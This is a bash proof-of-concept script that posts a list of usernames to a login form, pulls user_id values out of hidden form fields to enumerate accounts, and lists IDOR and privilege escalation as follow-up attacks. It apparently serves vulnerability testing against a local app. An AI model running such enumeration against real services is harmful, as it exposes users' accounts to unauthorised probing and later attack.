#!/bin/bash

# POC: User ID Information Disclosure in Password Form
# This script demonstrates how user_id values are exposed in hidden form fields
# during the login process, allowing user enumeration and information gathering

TARGET_URL="${1:-http://localhost:5000}"
USERNAMES=("test" "admin" "user1" "nonexistent_user_12345")

echo "========================================="
echo "User ID Information Disclosure POC"
echo "========================================="
echo "Target: $TARGET_URL"
echo ""

# Test user enumeration via user_id disclosure
echo "[*] Testing user_id disclosure for multiple usernames..."
echo ""

for username in "${USERNAMES[@]}"; do
    echo "[+] Testing username: $username"
    
    # Submit username to login form
    response=$(curl -s -X POST "$TARGET_URL/login" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$username" \
        -L)
    
    # Extract user_id from hidden form field
    user_id=$(echo "$response" | grep -oP 'name="user_id"[^>]*value="\K[^"]+' | head -1)
    
    # Check if user_id was found in response
    if [ -n "$user_id" ]; then
        echo "    ✓ User ID DISCLOSED: $user_id"
        echo "    Response contains: <input type=\"text\" ... name=\"user_id\" ... value=\"$user_id\" hidden>"
    else
        echo "    ✗ No user_id found (user likely doesn't exist or different response)"
    fi
    
    echo ""
done

echo "[*] Information Disclosure Analysis:"
echo "    - Attacker can enumerate valid usernames by monitoring user_id disclosure"
echo "    - Exposed user_id values can be used for:"
echo "      1. IDOR attacks (manipulating user_id in requests)"
echo "      2. Privilege escalation attempts"
echo "      3. Targeted API calls with known user_id"
echo "      4. Account enumeration and mapping"
echo ""
echo "========================================="